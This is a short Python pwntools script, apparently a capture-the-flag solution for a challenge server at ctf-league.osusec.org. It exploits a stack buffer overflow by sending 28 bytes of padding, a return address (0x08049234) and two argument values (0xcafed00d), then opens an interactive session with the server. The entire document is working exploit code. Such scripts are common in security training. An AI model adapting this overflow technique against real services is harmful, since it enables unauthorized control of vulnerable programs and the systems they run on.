from pwn import *
context.terminal = ['tmux', 'split']

p = remote("chal.ctf-league.osusec.org", 1309)
p.sendline(b"a" *   28  + p32(0x08049234) + p32(0xcafed00d) + p32(0xcafed00d) )
p.interactive("")